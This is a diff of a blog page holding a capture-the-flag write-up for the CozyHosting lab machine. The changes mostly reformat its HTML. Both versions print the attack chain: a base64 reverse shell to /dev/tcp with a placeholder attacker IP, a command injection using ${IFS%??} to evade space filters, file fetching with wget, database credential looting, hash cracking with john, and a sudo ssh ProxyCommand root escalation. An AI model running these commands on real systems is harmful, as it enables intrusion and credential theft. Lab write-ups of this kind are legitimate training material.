@@ -57,136 +57,122 @@
 </blockquote>
 
 <h2 id="1-enumeration">1: Enumeration</h2>
-
+<p><br /><br /></p>
 <ul>
-  <li>Check the active connection</li>
-</ul>
-
-<p><img src="/assets/images/cozyhosting/Untitled.png" alt="Untitled" /></p>
-
-<ul>
-  <li>Scanning ports</li>
-</ul>
-
-<p><img src="/assets/images/cozyhosting/Untitled%201.png" alt="Untitled" /></p>
-
-<p>We can see there’s a web services running in 80 port and ssh service in 22 port it could be a way to get in later.</p>
-
-<ul>
-  <li>Dirsearch looking for enable directories</li>
-</ul>
-
-<p><img src="/assets/images/cozyhosting/Untitled%202.png" alt="Untitled" /></p>
-
-<p>Something interesting in /actuator/sessions</p>
-
-<h2 id="2-looking-around">2: Looking around</h2>
-
-<ul>
-  <li>There is a possible cookie hijacking vulnerability.</li>
-</ul>
-
-<p><img src="/assets/images/cozyhosting/Untitled%203.png" alt="Untitled" /></p>
-
-<ul>
-  <li>We can use BurpSuite</li>
-</ul>
-
-<p><img src="/assets/images/cozyhosting/Untitled%204.png" alt="Untitled" /></p>
-
-<ul>
-  <li>We simulate the log in process and inject the cookie, we change it at the right side bar</li>
-</ul>
-
-<p><img src="/assets/images/cozyhosting/Untitled%205.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/cozyhosting/Untitled%206.png" alt="Untitled" /></p>
-
-<h2 id="3-user-flag">3: User flag</h2>
-
-<ul>
-  <li>It executes commands, so get can make a rev shell to get access</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/&lt;your-ip&gt;/&lt;your-port&gt; 0&gt;&amp;1"</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span><span class="nb">echo</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span><span class="s2">"&lt;your payload here&gt;"</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span>|<span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span><span class="nb">base64</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span><span class="nt">-d</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span>|<span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span>bash<span class="p">;</span>
-</code></pre></div></div>
-
-<p>${IFS%??} For blank spaces and convert it to url format</p>
-
-<ul>
-  <li>We use nc to receive the connection and make the shell stable like this</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+  <li>Check the active connection
+<br /><br />
+<img src="/assets/images/cozyhosting/Untitled.png" alt="Untitled" />
+<br /><br /></li>
+  <li>Scanning ports
+<br /><br />
+<img src="/assets/images/cozyhosting/Untitled%201.png" alt="Untitled" />
+<br /><br />
+We can see there’s a web services running in 80 port and ssh service in 22 port it could be a way to get in later.
+<br /><br /></li>
+  <li>Dirsearch looking for enable directories
+<br /><br />
+<img src="/assets/images/cozyhosting/Untitled%202.png" alt="Untitled" />
+<br /><br />
+Something interesting in /actuator/sessions
+<br /><br />
+    <h2 id="2-looking-around">2: Looking around</h2>
+    <p><br /><br /></p>
+  </li>
+  <li>There is a possible cookie hijacking vulnerability.
+<br /><br />
+<img src="/assets/images/cozyhosting/Untitled%203.png" alt="Untitled" />
+<br /><br /></li>
+  <li>We can use BurpSuite
+<br /><br />
+<img src="/assets/images/cozyhosting/Untitled%204.png" alt="Untitled" />
+<br /><br /></li>
+  <li>We simulate the log in process and inject the cookie, we change it at the right side bar
+<br /><br />
+<img src="/assets/images/cozyhosting/Untitled%205.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/cozyhosting/Untitled%206.png" alt="Untitled" />
+<br /><br />
+    <h2 id="3-user-flag">3: User flag</h2>
+    <p><br /><br /></p>
+  </li>
+  <li>It executes commands, so get can make a rev shell to get access
+<br /><br />
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/&lt;your-ip&gt;/&lt;your-port&gt; 0&gt;&amp;1"</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0
+</code></pre></div>    </div>
+    <p><br /><br /></p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span><span class="nb">echo</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span><span class="s2">"&lt;your payload here&gt;"</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span>|<span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span><span class="nb">base64</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span><span class="nt">-d</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span>|<span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span>bash<span class="p">;</span>
+</code></pre></div>    </div>
+    <p><br /><br />
+${IFS%??} For blank spaces and convert it to url format
+<br /><br /></p>
+  </li>
+  <li>We use nc to receive the connection and make the shell stable like this
+<br /><br />
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
 <span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
 ctrl + z
 <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
-</code></pre></div></div>
-
-<p>We use cat etc/passwd for user</p>
-
-<ul>
-  <li>We’ve got and .jar with db credentials, using python</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 7777
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://10.10.00.000:7777/&lt;file_name&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Look for creds:</li>
-</ul>
-
-<p><img src="/assets/images/cozyhosting/Untitled%207.png" alt="Untitled" /></p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psql <span class="nt">-h</span> 127.0.0.1 <span class="nt">-U</span> postgres
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\c</span> cozyhosting
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\d</span>
+</code></pre></div>    </div>
+    <p><br /><br />
+We use cat etc/passwd for user
+<br /><br /></p>
+  </li>
+  <li>We’ve got and .jar with db credentials, using python
+<br /><br />
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 7777
+</code></pre></div>    </div>
+    <p><br /><br /></p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://10.10.00.000:7777/&lt;file_name&gt;
+</code></pre></div>    </div>
+    <p><br /><br /></p>
+  </li>
+  <li>Look for creds:
+<br /><br />
+<img src="/assets/images/cozyhosting/Untitled%207.png" alt="Untitled" />
+<br /><br />
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psql <span class="nt">-h</span> 127.0.0.1 <span class="nt">-U</span> postgres
+</code></pre></div>    </div>
+    <p><br /><br /></p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\c</span> cozyhosting
+</code></pre></div>    </div>
+    <p><br /><br /></p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\d</span>
 <span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
-</code></pre></div></div>
-
-<p>We got the hash for admin, we solve using</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john hash.txt <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
-</code></pre></div></div>
-
-<p>We use ssh to break into</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh josh@10.10.11.230
-</code></pre></div></div>
-
-<h2 id="4-priv-esc">4: Priv esc</h2>
-
-<ul>
-  <li>Using sudo -l</li>
-</ul>
-
-<p><img src="/assets/images/cozyhosting/Untitled%208.png" alt="Untitled" /></p>
-
-<ul>
-  <li>In <a href="https://gtfobins.github.io/gtfobins/ssh/#sudo">https://gtfobins.github.io/gtfobins/ssh/#sudo</a> We find a way to get root access easily</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>ssh <span class="nt">-o</span> <span class="nv">ProxyCommand</span><span class="o">=</span><span class="s1">';sh 0&lt;&amp;2 1&gt;&amp;2'</span> x
-</code></pre></div></div>
-
-<p><img src="/assets/images/cozyhosting/Untitled%209.png" alt="Untitled" /></p>
-
-<ul>
+</code></pre></div>    </div>
+    <p><br /><br />
+We got the hash for admin, we solve using
+<br /><br /></p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john hash.txt <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</code></pre></div>    </div>
+    <p><br /><br />
+We use ssh to break into
+<br /><br /></p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh josh@10.10.11.230
+</code></pre></div>    </div>
+    <p><br /><br /></p>
+    <h2 id="4-priv-esc">4: Priv esc</h2>
+    <p><br /><br /></p>
+  </li>
+  <li>Using sudo -l
+<br /><br />
+<img src="/assets/images/cozyhosting/Untitled%208.png" alt="Untitled" />
+<br /><br /></li>
+  <li>In <a href="https://gtfobins.github.io/gtfobins/ssh/#sudo">https://gtfobins.github.io/gtfobins/ssh/#sudo</a> We find a way to get root access easily
+<br /><br />
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>ssh <span class="nt">-o</span> <span class="nv">ProxyCommand</span><span class="o">=</span><span class="s1">';sh 0&lt;&amp;2 1&gt;&amp;2'</span> x
+</code></pre></div>    </div>
+    <p><br /><br />
+<img src="/assets/images/cozyhosting/Untitled%209.png" alt="Untitled" />
+<br /><br /></p>
+  </li>
   <li>Machine pwned
+<br /><br />
 <img src="/assets/images/cozyhosting/Untitled%2010.png" alt="Untitled" /></li>
 </ul>
 
 <script src="/assets/js/matrix-overlay.js"></script>
+
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
 
 
 
